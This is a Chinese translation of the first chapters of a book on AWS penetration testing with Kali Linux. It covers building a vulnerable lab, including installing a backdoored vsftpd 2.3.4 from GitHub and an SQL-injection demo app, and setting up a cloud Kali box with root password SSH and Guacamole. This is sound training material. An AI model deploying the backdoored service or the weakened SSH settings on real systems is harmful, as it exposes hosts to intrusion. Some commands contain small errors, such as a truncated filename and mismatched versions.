# Kali Linux AWS 渗透测试实用指南（一）

> 原文：[`annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7`](https://annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

这本书是第一本这样的书，将帮助您通过渗透测试来保护您的**Amazon Web Services**（**AWS**）基础架构的各个方面。它介绍了在 AWS 中设置测试环境、使用各种工具执行侦察以识别易受攻击的服务、查找各种组件的错误配置和不安全配置，以及如何利用漏洞来进一步获取访问权限的过程。

# 本书适合谁

如果您是一名安全分析师或渗透测试人员，有兴趣利用云环境来建立易受攻击的区域，然后保护它们，这本书适合您。基本的渗透测试、AWS 及其安全概念的理解将是必要的。

# 充分利用本书

确保您已经设置了 AWS 帐户，并确保您对 AWS 服务及其相互配合的工作原理有很好的理解。

# 下载示例代码文件

您可以从[www.packt.com](http://www.packt.com)的帐户中下载本书的示例代码文件。如果您在其他地方购买了这本书，您可以访问[www.packt.com/support](http://www.packt.com/support)并注册，以便文件直接通过电子邮件发送给您。

您可以按照以下步骤下载代码文件：

1.  在[www.packt.com](http://www.packt.com)上登录或注册。

1.  选择“支持”选项卡。

1.  单击“代码下载和勘误”。

1.  在搜索框中输入书名，然后按照屏幕上的说明进行操作。

下载文件后，请确保使用最新版本的解压缩或提取文件夹：

+   Windows 的 WinRAR/7-Zip

+   Mac 的 Zipeg/iZip/UnRarX

+   Linux 的 7-Zip/PeaZip

该书的代码包也托管在 GitHub 上，网址为[`github.com/PacktPublishing/Hands-On-AWS-Penetration-Testing-with-Kali-Linux`](https://github.com/PacktPublishing/Hands-On-AWS-Penetration-Testing-with-Kali-Linux)。如果代码有更新，将在现有的 GitHub 存储库上进行更新。

我们还有其他代码包，来自我们丰富的图书和视频目录，可在[`github.com/PacktPublishing/`](https://github.com/PacktPublishing/)上找到。请查看！

# 下载彩色图像

我们还提供了一个 PDF 文件，其中包含本书中使用的屏幕截图/图表的彩色图像。您可以在这里下载：`www.packtpub.com/sites/default/files/downloads/9781789136722_ColorImages.pdf`。

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：指示文本中的代码单词，数据库表名，文件夹名称，文件名，文件扩展名，路径名，虚拟 URL，用户输入和 Twitter 句柄。这是一个例子：“这些信息在我们刚刚在`"Environment"`键下进行的`ListFunctions`调用中返回给我们。”

代码块设置如下：

```
"Environment": {
    "Variables": {
        "app_secret": "1234567890"
   }
}
```

当我们希望引起您对代码块的特定部分的注意时，相关行或项目将以粗体设置：

```
:%s/^/kirit-/g
or :%s/^/<<prefix>>/g
```

任何命令行输入或输出都以以下方式编写：

```
aws lambda list-functions --profile LambdaReadOnlyTester --region us-west-2
```

**粗体**：表示新术语，重要单词或屏幕上看到的单词。例如，菜单或对话框中的单词会以这种方式出现在文本中。这是一个例子：“现在，点击创建存储桶来创建它。”

警告或重要说明会以这种方式出现。

提示和技巧会以这种方式出现。


# 第一部分：AWS 上的 Kali Linux

本节是针对初学者的介绍，介绍了一个没有准备好的 AWS 环境的个人如何设置实验室来练习其渗透测试技能，以及他们可以练习技能的方式。它还指导读者如何在 AWS 上设置一个 Kali pentestbox，只需使用一个网页浏览器就可以轻松访问。

本节将涵盖以下章节：

+   第一章，*在 AWS 上设置渗透测试实验室*

+   第二章，*在云上设置 Kali Pentestbox*

+   第三章，*在云上使用 Kali Linux 进行利用*


# 第一章：在 AWS 上设置渗透测试实验室

本章旨在帮助无法直接访问渗透测试目标的渗透测试人员在 AWS 内部设置易受攻击的实验室环境。这个实验室将允许测试人员使用 Metasploit 进行各种利用技术的实践，并使用 Kali 内的多个工具进行基本扫描和漏洞评估。本章重点介绍在 AWS 上设置易受攻击的 Linux VM 和通用 Windows VM，将它们放在同一个网络上。

在本章中，我们将涵盖以下主题：

+   在云上设置个人渗透测试实验室进行黑客攻击

+   配置和保护虚拟实验室以防止意外访问

# 技术要求

在本章中，我们将使用以下工具：

+   可恶的易受攻击的 Web 应用程序

+   **非常安全的文件传输协议守护程序**（**vsftpd**）版本**2.3.4**

# 设置易受攻击的 Ubuntu 实例

作为我们将要创建的两台易受攻击的机器中的第一台，易受攻击的 Ubuntu 实例将包含一个易受攻击的 FTP 服务，以及一些其他服务。

# 提供一个 Ubuntu EC2 实例

在云中设置易受攻击的实验室的第一步将是提供一个运行易受攻击操作系统的实例。为此，我们可以使用 Ubuntu LTS 版本。这可以从 AWS Marketplace 快速部署。

我们将使用 Ubuntu 16.04 来实现这一目的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/9fc1fba3-0bfd-4d8f-b9ca-cf0a3c67344a.png)

一旦单击“继续订阅”按钮，我们将提示配置要启动的实例。由于这是一个非常标准的镜像，我们将使用默认设置，除了区域和 VPC 设置。

对于区域，您可以使用距离自己最近的 AWS 区域。但是，请记住，您在 AWS 上创建的所有其他实例都需要托管在同一个区域，否则它们无法成为同一网络的一部分。

对于 VPC，请确保您记下了用于设置此实例的 VPC 和子网 ID。我们需要为实验室中的所有其他主机重复使用它们。在这种情况下，我将使用以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8af80f17-d919-4eda-88bb-47208f2797e0.png)

应该注意的是，VPC ID 和子网 ID 对每个人都是唯一的。完成后，我们可以通过单击“一键启动”按钮来部署 EC2 实例。

完成后，下一步是使用以下命令 SSH 到新创建的 VM：

```
ssh -i <pem file> <IP address of the instance>
```

连接后，运行以下命令：

```
sudo apt-get update && sudo apt-get dist-upgrade
```

这些命令将更新存储库列表和实例上安装的所有软件包，因此我们不必处理任何旧软件包。

# 在 Ubuntu 上安装易受攻击的服务

对于这个 Ubuntu 主机，我们将安装一个易受攻击版本的 FTP 服务器`vsftpd`。发现 2.3.4 版本的这个 FTP 软件被植入了后门。在本章中，我们将安装这个带有后门的版本，然后将尝试使用我们将在下一章中设置的渗透测试盒来识别它，最后我们将利用它。

为了使事情变得更容易，`vsftpd 2.3.4`的后门版本被存档在 GitHub 上。我们将使用该代码库来安装易受攻击的软件。首先，我们需要克隆`git`存储库：

```
git clone https://github.com/nikdubois/vsftpd-2.3.4-infected.git
```

接下来，我们需要安装用于设置主要构建环境的软件包。为此，我们运行以下命令：

```
sudo apt-get install build-essential
```

现在，我们`cd`进入`vsftpd`文件夹以从源代码构建它。但是，在这之前，我们需要对`Makefile`进行一些小改动。需要添加`-lcrypt`值作为链接器标志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d9b46007-7258-4dc3-91a4-16178cba3cdc.png)

完成后，保存文件并运行`make`。

如果一切顺利，我们应该在同一个文件夹中看到一个`vsftpd`二进制文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e1551d0e-a19f-4364-b5a5-7f538385bb6a.png)

接下来，我们需要在安装`vsftpd`之前设置一些先决条件。即，我们需要添加一个名为`nobody`的用户和一个名为`empty`的文件夹。要做到这一点，请运行以下命令：

```
useradd nobody
mkdir /usr/share/empty
```

完成后，我们可以通过执行以下命令来运行安装：

```
sudo cp vsftpd /usr/local/sbin/vsftpd
sudo cp vsftpd.8 /usr/local/man/man8
sudo cp vsftpd.conf.5 /usr/local/man/man5
sudo cp vsftpd.conf /etc
```

完成后，我们需要执行`vsftpd`二进制文件，以确认我们是否可以连接到`localhost`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/274a3cfc-db75-4b33-bd04-dcbee35055e6.png)

下一步是设置 FTP 服务器的匿名访问。为此，我们需要运行以下命令：

```
mkdir /var/ftp/
useradd -d /var/ftp ftp
chown root:root /var/ftp chmod og-w /var/ftp

```

最后，通过对`/etc/vsftpd.conf`进行以下更改，启用对`vsftpd`服务器的本地登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6d445a60-e1fc-4b35-9e1e-3bfacf67df75.png)

# 设置易受攻击的 Windows 实例

通过设置易受攻击的 Linux 服务器，我们现在通过运行易受攻击的 Web 应用程序的 Windows 服务器来设置一个攻击向量。该应用程序将提供两个环境，读者可以在其中尝试他们的手，而无需实际的测试环境。

# 配置易受攻击的 Windows 服务器实例

为了本实验宿主的目的，我们将使用 AWS Marketplace 上的 Server 2003 实例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/1470f873-c326-4b00-be42-5ffb48a7a4d5.png)

配置步骤与我们之前设置 Linux 实例的步骤基本相同。应注意 VPC 设置与我们为以前的实例使用的设置相似。这将稍后允许我们配置 VM 以处于相同的网络上。

在验证 VPC 设置和区域后，我们继续启动实例，就像我们之前做的那样。最后，我们设置一直在使用的密钥对，然后就可以开始了。实例启动后，我们需要遵循稍有不同的流程来远程访问 Windows 实例。由于**远程桌面协议**（**RDP**）不支持基于证书的身份验证，我们需要提供私钥来解密并获取密码，以便我们可以登录。只需右键单击实例，然后选择获取 Windows 密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f7064e60-0172-49da-a088-44fba472bd8f.png)

在接下来的屏幕上，我们需要上传之前下载的私钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7c197943-5ce7-43cc-9968-133dd87b66ca.png)

完成后，只需单击“解密密码”即可为我们提供密码，我们可以使用该密码远程桌面连接到我们的 Windows 服务器实例。完成后，只需启动远程桌面并使用显示的凭据连接到 IP 地址即可。

一旦我们登录，下一步是在 Windows 服务器上设置 XAMPP，这样我们就可以在服务器上托管一个易受攻击的网站。但在继续之前，我们需要在服务器上安装最新版本的 Firefox，因为随 Windows Server 2003 捆绑的 Internet Explorer 版本相当陈旧，不支持一些网站配置。要下载 XAMPP，只需访问[`www.apachefriends.org/download.html`](https://www.apachefriends.org/download.html)并下载适用于 XP 和 Windows Server 2003 的版本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/20733b18-76c1-46df-92ba-fcdf3274caf5.png)

请注意，您需要向下滚动并下载正确版本的 XAMPP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3c4e5bef-6397-4283-824d-8d4363d17b6b.png)

最后，我们需要按照默认安装过程进行，然后我们将获得一个可用的 PHP、Apache 和 MySQL 安装，以及一些必要的实用程序，用于管理网站。

# 在 Windows 上配置易受攻击的 Web 应用程序

在本节中，我们将为渗透测试实验室设置一个极易受攻击的 Web 应用程序。首先，让我们通过访问`C:\xampp\htdocs`来清理 XAMPP 托管文件夹。

创建一个名为`_bak`的新文件夹，并将所有现有文件剪切并粘贴到该文件夹中。现在，让我们下载易受攻击的网站源代码。为此，我们将使用 GitHub 上提供的众多易受攻击的 PHP 示例之一：[`github.com/ShinDarth/sql-injection-demo/`](https://github.com/ShinDarth/sql-injection-demo/)。

最快获取文件的方法是直接下载 ZIP 文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/cce34f3c-df63-4dd5-a15b-79b9479b626f.png)

下载源代码

下载后，只需将 ZIP 文件的内容复制到`C:\xampp\htdocs`文件夹中。如果操作正确，文件结构应如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6a2f430b-c1ea-4781-9409-508b8dcc8cc4.png)

文件结构

完成后，下一步是为应用程序创建数据库并将数据导入其中。为了实现这一点，您需要访问 phpMyAdmin 界面，该界面可在`http://127.0.0.1/phpmyadmin`访问。在这里，选择最近的“新建”选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/04d6b2bd-31fb-4f05-9aea-618a3deb561c.png)

在这里，我们创建一个名为`sqli`的新数据库：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c751633d-f942-4efe-a228-639e79c9621d.png)

接下来，要将数据导入到新创建的数据库中，我们进入导入选项卡，并浏览到刚刚提取到`htdocs`文件夹中的`database.sql`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/47b3d1b6-a89c-411f-aca1-f680a9f70d7d.png)

点击 Go 后，我们将看到一个成功的消息。现在，如果我们在浏览器中浏览`http://127.0.0.1`，我们将能够访问易受攻击的网站：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7b766f5a-38ed-4ee6-934f-6ed16af1c008.png)

恭喜，您已成功在 Windows 服务器上配置了一个易受攻击的 Web 应用程序！下一步将是在我们的 VPC 内设置网络规则，以便易受攻击的主机可以从其他 EC2 实例访问。

# 在实验室内配置安全组

现在我们已经设置了两个易受攻击的服务器，下一步是配置网络，使我们的 Web 应用程序对外部不可访问，同时使其他实验室机器可以相互通信。

# 配置安全组

我们最初将所有 EC2 实例设置为在同一个 VPC 上。这意味着 EC2 实例将位于同一子网上，并且可以通过内部 IP 地址相互通信。但是，AWS 不希望允许同一 VPC 上的所有 4,096 个地址相互通信。因此，默认安全组不允许 EC2 实例之间的通信。

为了允许 Ubuntu 实例连接到 Windows 实例（您可以在下一章中为 Kali 实例重复这些步骤），第一步是获取 Ubuntu 主机的私有 IP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/36e57154-2299-4e2e-8adc-d85ed0430062.png)

显示私有 IP 的描述选项卡

接下来，我们需要修改第一个 Windows 实例的安全组规则。只需在摘要窗格中点击安全组名称即可进入安全组屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6cfc515d-07d6-450c-89c2-a57b0260a197.png)

安全组屏幕

现在我们只需要点击编辑按钮，添加规则允许从 Kali Linux 实例中访问所有流量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a5dbb1c7-34b4-4f58-8c68-79ad2f1c46c8.png)

完成后，只需保存此配置。为了确认 Kali 现在可以与 Windows 服务器通信，让我们运行一个`curl`命令，看看网站是否可访问：

```
curl -vL 172.31.26.219
```

确保用您的 Windows IP 地址替换 IP 地址。如果一切顺利，应该会有一堆 JavaScript 作为响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ef9ce96e-d12c-490a-9fbc-215004ce5fc1.png)

在下一章中，一旦 Kali PentestBox 设置完成，可以使用上述步骤在 Ubuntu 和 Windows 服务器实例上将 Kali Linux IP 地址列入白名单，以便开始对实验室环境进行黑客攻击！

# 摘要

在本章中，我们已经建立了一个实验室，对于没有测试环境或实际实验经验的初学者渗透测试人员来说，这可能是有用的。在我们的实验室中，我们设置了一个运行易受攻击服务的 Ubuntu 主机，还设置了一个运行易受攻击 Web 应用程序的 Windows 服务器主机。这代表了任何环境中攻击的两个最大的表面区域。此外，我们还经历了建立各个实例之间的网络连接的过程。通过这些步骤，用户可以在云中设置任何操作系统实例，设置安全组以配置网络，并防止未经授权的访问。

在下一章中，我们将研究如何设置 Kali PentestBox，使用它可以对我们设置的两个易受攻击的 EC2 实例进行扫描、枚举和利用。

# 进一步阅读

+   漏洞和利用数据库：[`www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor`](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor)

+   Amazon 虚拟私有云（用户指南）：[`docs.aws.amazon.com/AmazonVPC/latest/UserGuide/VPC_Introduction.html`](https://docs.aws.amazon.com/AmazonVPC/latest/UserGuide/VPC_Introduction.html)


# 第二章：在云上设置 Kali PentestBox

有一个现成的**Amazon Machine Image**（**AMI**）在亚马逊市场上运行 Kali Linux。这意味着渗透测试人员可以快速在亚马逊云上设置 Kali Linux 实例，并随时访问它进行任何类型的渗透测试。本章重点介绍在 Amazon EC2 实例上创建一个实例，使用 Kali Linux AMI 进行设置，并以各种方式配置对此主机的远程访问。一旦设置好，渗透测试人员可以远程访问属于 AWS 帐户的**虚拟私有云**（**VPC**），并在该 VPC 内和任何远程主机上使用 Kali 进行渗透测试。

在本章中，我们将学习以下内容：

+   如何在亚马逊云上运行 Kali Linux

+   通过 SSH 远程访问 Kali

+   通过无客户端 RDP 远程访问 Kali

# 技术要求

在本章中，我们将使用以下工具：

+   AWS EC2 实例

+   Kali Linux AMI

+   Apache Guacamole ([`guacamole.apache.org`](https://guacamole.apache.org))

+   SSH 客户端和浏览器

# 在 AWS EC2 上设置 Kali Linux

在本节中，我们将介绍在云上设置虚拟渗透测试机器的最初步骤，以及设置远程访问以便随时进行渗透测试。渗透测试机器将与第一章中设置的渗透测试实验室*在 AWS 上设置渗透测试实验室*相辅相成，该实验室允许您对这些主机进行渗透测试和利用。

# Kali Linux AMI

AWS 提供了一个令人着迷的功能，允许在亚马逊云上快速部署**虚拟机**（**VMs**）—**Amazon Machine Images**（**AMIs**）。这些作为模板，允许用户在 AWS 上快速设置新的 VM，而无需像传统 VM 那样手动配置硬件和软件。然而，这里最有用的功能是 AMIs 允许您完全绕过操作系统安装过程。因此，决定需要什么操作系统并在云上获得一个完全功能的 VM 所需的时间总量减少到几分钟——和几次点击。

Kali Linux AMI 是最近才添加到 AWS 商店的，我们将利用它来快速在亚马逊云上设置我们的 Kali VM。使用现成的 AMI 设置 Kali 实例非常简单——我们首先访问 AWS Marketplace 中的 Kali Linux AMI：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d31c2806-f832-4792-be31-3f5905d33b6c.png)

前面的截图显示了以下信息：

+   我们正在使用的 AMI 版本（2018.1）

+   在默认实例中运行这个的典型总价格

+   AMI 的概述和详细信息

值得注意的是，Kali Linux 的默认推荐实例大小是 t2.medium，如我们在定价信息下所见：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f43d09cd-a3c9-4b4d-b6e0-42ec917f718b.png)

在页面的下方，我们可以看到 t2.medium 实例的大小包括两个 CPU 虚拟核心和 4GiB 的 RAM，这对于我们的设置来说已经足够了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d9273c83-00cd-475e-a404-701eacc60f0a.png)

一旦确认我们根据要求设置了镜像，我们可以继续点击“继续订阅”选项来进行实例设置。

# 配置 Kali Linux 实例

在前一节中，我们确认了要使用的 AMI 以及我们将使用的机器的规格，以启动我们的 Kali 机器。一旦选择了这些，就是启动我们的机器的时候了。

这将带我们到 EC2 页面。这里包含一些需要设置的选项：

+   **我们将使用的 AMI 版本**：通常建议使用市场上可用的最新版本的 AMI。通常情况下，这不是默认选择的 Kali Linux 版本。在撰写本文时，最新版本是 2018.1，构建日期是 2018 年 2 月，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7bd1533f-db26-48b1-8492-fd3dc3bb0438.png)

自 2019.1 版本发布后，您需要下载最新版本的 Kali Linux。

+   **我们将部署实例的区域**：如在第一章中所讨论的，在 AWS 上设置渗透测试实验室，我们需要将区域设置为地理位置最接近当前位置的数据中心。

+   **EC2 实例大小**：这已经在上一步中验证过了。我们将在本书的后面部分更深入地研究各种实例类型和大小。

+   **VPC 设置**：VPC 和子网设置需要设置为使用我们在第一章中设置渗透测试实验室时使用的相同 VPC。这将使我们的黑客工具箱与我们之前设置的易受攻击的机器处于同一网络中。设置应该与上一章中配置的相匹配：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/09ab7eb9-b05a-456c-8106-4fa2501c2188.png)

+   **安全组**：之前，我们设置了安全组，以便未经授权的外部人员无法访问实例。然而，在这种情况下，我们需要允许远程访问我们的 Kali 实例。因此，我们需要将 SSH 和 Guacamole 远程访问端口转发到一个新的安全组：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a09c1fe1-c7e5-40ec-915f-52b15784e0fb.png)

+   密钥对：我们可以使用在第一章中设置实验室环境时创建的相同密钥对，*在 AWS 上设置渗透测试实验室*。

有了这些设置，我们就可以点击“一键启动”来启动实例了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4f338529-165a-4eb0-8bc7-c20ad551be69.png)

然后 AWS 将启动 Kali 机器并分配一个公共 IP。然而，我们需要能够访问这台机器。在下一节中，我们将看到如何使用 OpenSSH 来访问 Kali 机器。

# 配置 OpenSSH 进行远程 SSH 访问

AWS 已经为他们的 Kali AMI 设置了默认的 SSH 访问形式，使用公钥的`ec2-user`帐户。然而，这对于通过移动设备访问并不方便。对于希望通过移动应用程序直接以 root 权限方便地 SSH 到他们的 Kali 实例的用户，以下部分将介绍该过程。然而，需要注意的是，使用具有 PKI 身份验证的有限用户帐户是通过 SSH 连接的最安全方式，如果保护实例是优先考虑的话，不建议使用具有密码的 root 帐户。

# 设置 root 和用户密码

在 Kali Linux 实例上配置 root SSH 的第一步是设置 root 密码。通常情况下，使用具有`sudo`权限的`ec2-user`帐户的`ec2`实例不会为 root 帐户设置密码。然而，由于我们正在设置来自移动 SSH 应用程序的 SSH 访问，这需要设置。然而，需要注意的是，这会降低 Kali 实例的安全性。

更改 root 密码就像在 SSH 终端上运行`sudo passwd`一样简单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/de40240e-d823-46a2-80e3-ac0e2383dc1a.png)

同样，当前用户的密码也可以通过在 SSH 上运行`sudo passwd ec2-user`来更改：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5d806ab5-0848-4e40-819b-51612abc565e.png)

这将有助于在不支持身份验证密钥的 SSH 客户端应用程序中作为`ec2-user`进行 SSH。然而，在我们能够以 root 身份 SSH 到 Kali 实例之前，还有另一步需要完成。

# 在 SSH 上启用 root 和密码身份验证

作为增强的安全措施，OpenSSH 服务器默认情况下禁用了 root 登录。启用这一点是一个简单的过程，涉及编辑一个配置文件，`/etc/ssh/sshd_config`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/869ede0f-4bfe-48c6-99c1-0628a7037da2.png)

其中关键的部分是两个条目：

+   PermitRootLogin：如果要以 root 身份登录，可以将其设置为`yes`

+   PasswordAuthentication：需要将其设置为`yes`，而不是默认的`no`，以便使用密码登录。

完成更改后，您需要重新启动 ssh 服务：

```
sudo service ssh restart
```

有了这个，我们在云上的 Kali 机器已经启动并运行，并且可以通过密码进行 SSH 访问。但是，SSH 只能为您提供命令行界面。

在下一节中，我们将看看如何设置远程桌面服务以获得对 Kali 机器的 GUI 访问。

# 设置 Guacamole 进行远程访问

Apache Guacamole 是一种无客户端的远程访问解决方案，它将允许您使用浏览器远程访问 Kali Linux 实例。这将使您能够即使在移动设备上也可以访问 PentestBox，而无需担心远程访问周围的其他复杂性。访问此类服务器的传统方式是通过 SSH，但是当从移动设备访问时，这将无法提供 GUI。

# 加固和安装先决条件

设置远程访问虚拟机可能是一件危险的事情，因此建议安装和设置防火墙和 IP 黑名单服务，以防范针对互联网的暴力破解和类似攻击。我们将安装的服务是`ufw`和`fail2ban`。它们非常容易设置：

1.  您只需要运行以下命令：

```
sudo apt-get install ufw fail2ban
```

1.  安装了`ufw`防火墙后，我们需要允许用于远程访问的两个端口：`22`用于 SSH 和`55555`用于 Guacamole。因此，我们需要运行以下命令：

```
sudo ufw allow 22
sudo ufw allow 55555
```

1.  完成后，我们需要重新启动`ufw`服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f01117ce-17cc-48f4-9bbe-5f19ba7a9d01.png)

1.  接下来，我们需要安装 Apache Guacamole 的先决条件。您可以通过执行以下命令来实现：

```
sudo apt-get install build-essential htop libcairo2-dev libjpeg-dev libpng-dev libossp-uuid-dev tomcat8 freerdp2-dev libpango1.0-dev libssh2-1-dev libtelnet-dev libvncserver-dev libpulse-dev libssl-dev libvorbis-dev
```

1.  安装后，我们需要修改 Apache Tomcat 的配置，使其监听端口`55555`（与我们的安全组设置相匹配），而不是默认的`8080`。为此，我们需要运行以下命令：

```
sudo nano /etc/tomcat8/server.xml
```

1.  在这个文件中，`Connector port`需要从`8080`更改为`55555`，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/45c6d56c-5128-40c3-89a9-a381e9a5cc27.png)

1.  接下来，我们需要在 Kali 实例上设置 RDP 服务。通过以下命令安装`xrdp`可以轻松实现这一点：

```
sudo apt install xrdp
```

1.  接下来，我们需要允许所有用户访问 RDP 服务（X 会话）。这需要编辑一个文件：

```
sudo nano /etc/X11/Xwrapper.config
```

1.  在这个文件中，将`allowed_users`的值编辑为`anybody`：

```
allowed_users=anybody
```

1.  最后，我们需要设置`xrdp`服务自动启动并`enable`服务：

```
sudo update-rc.d xrdp enable
sudo systemctl enable xrdp-sesman.service
sudo service xrdp start
sudo service xrdp-sesman start
```

1.  完成这一步后，我们需要从[`guacamole.apche.org/releases/`](https://guacamole.apache.org/releases/)下载 Apache Guacamole 服务器的源代码。

请记住，您需要下载最新的`guacamole-server.tar.gz`和`guacamole.war`文件。在撰写本文时，最新版本是`0.9.14`，我们可以使用以下命令下载：

```
wget http://mirrors.estointernet.in/apache/guacamole/1.0.0/source/guacamole-server-1.0.0.tar.gz
wget http://mirrors.estointernet.in/apache/guacamole/1.0.0/binary/guacamole-1.0.0.wa
```

1.  一旦这些文件被下载，我们需要通过执行以下代码来提取源代码：

```
tar xvf guacamole-server.tar.gz
```

1.  进入提取的目录后，我们需要构建和安装软件包。可以通过执行以下代码实现：

```
CFLAGS="-Wno-error" ./configure --with-init-dir=/etc/init.d
make -j4
sudo make install
sudo ldconfig
sudo update-rc.d guacd defaults
```

1.  一旦成功运行，Guacamole 就安装完成了。但是，为了完全设置远程访问，还需要进行进一步的配置。

# 为 SSH 和 RDP 访问配置 Guacamole

Guacamole 的默认配置目录是`/etc/guacamole`。它需要一个名为`guacamole.properties`的文件才能正常运行。还有一些其他目录，我们可能想要放在配置目录中，但对于当前的设置来说，它们是不需要的。

1.  Guacamole 属性文件应包含有关`guacamole 代理`地址的信息：

```
# Hostname and port of guacamole proxy
guacd-hostname: localhost
guacd-port:     4822
```

1.  除此之外，我们还需要在同一目录中添加一个名为`user-mapping.xml`的文件，其中包含 Guacamole 将进行身份验证的用户名和密码列表：

```
<user-mapping> <authorize username="USERNAME" password="PASSWORD">
 <connection name="RDP Connection"> <protocol>rdp</protocol> <param name="hostname">localhost</param> <param name="port">3389</param>
 </connection>
 <connection name="SSH Connection"> <protocol>ssh</protocol> <param name="hostname">localhost</param> <param name="port">22</param>
 </connection> </authorize>
</user-mapping>
```

1.  完成后，是时候部署我们之前下载的 war 文件了。我们需要将它移动到`tomcat8/webapps`文件夹中，以便自动部署：

```
mv guacamole-0.9.14.war /var/lib/tomcat8/webapps/guacamole.war
```

1.  现在，我们只需重新启动`guacd`和`tomcat8`服务，就可以让 Apache Guacamole 正常运行了！要做到这一点，使用以下命令：

```
sudo service guacd restart
sudo service tomcat8 restart
```

1.  还有最后一个配置步骤是必需的——将认证信息复制到 Guacamole 客户端目录中。执行以下代码即可完成：

```
mkdir /usr/share/tomcat8/.guacamole
ln -s /etc/guacamole/guacamole.properties /usr/share/tomcat8/.guacamole
```

1.  现在，如果我们将浏览器指向`ipaddr:55555/guacamole`，我们就能访问 Guacamole 了！我们会看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f16e884d-1970-4e84-a276-f94cf37d8c7f.png)

1.  我们必须使用在`user-mapping.xml`文件中设置的相同凭据登录。

1.  一旦我们成功登录，只需简单地选择我们想要访问服务器的技术：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e6040e16-2a6c-44bc-a265-c2bd1f40c3f2.png)

恭喜，您已成功在云上设置了 Kali PentestBox，并可以在任何地方使用浏览器远程访问！

# 摘要

通过阅读本章，您将能够成功在亚马逊云上设置 Kali Linux PentestBox，这将有助于您在接下来的章节中进行练习。我们学会了如何通过 SSH、RDP 和 Apache Guacamole 设置远程访问云实例。本章还着重介绍了有关云实例加固的某些信息，这将帮助您更好地理解本书后续有关 EC2 服务的一些高级安全概念。

在下一章中，我们将介绍如何使用我们在第一章中设置的 PentestBox 对我们的渗透测试实验室进行自动化和手动渗透测试的步骤。

# 问题

1.  与使用`tightvnc`等服务相比，使用 Guacamole 进行远程访问的优势是什么？

1.  使用当前设置，任何知道 IP 地址的人都可以轻松访问 Guacamole 界面。有没有办法保护服务器免受这种访问？

1.  在 Guacamole 编译过程中添加的`-Wno-error`标志的目的是什么？

1.  为什么默认的`sshd_config`将 PermitRootLogin 值设置为`no`？

1.  为什么 AWS 禁用基于密码的登录？

1.  我们可以使用 SSH 隧道来提高此设置的安全性吗？

# 进一步阅读

+   SSH 隧道：[`www.ssh.com/ssh/tunneling/`](https://www.ssh.com/ssh/tunneling/)

+   SSH 中的 PKI：[`www.ssh.com/pki/`](https://www.ssh.com/pki/)

+   代理 Guacamole：[`guacamole.apache.org/doc/gug/proxying-guacamole.html `](https://guacamole.apache.org/doc/gug/proxying-guacamole.html)


# 第三章：在云上使用 Kali Linux 进行利用

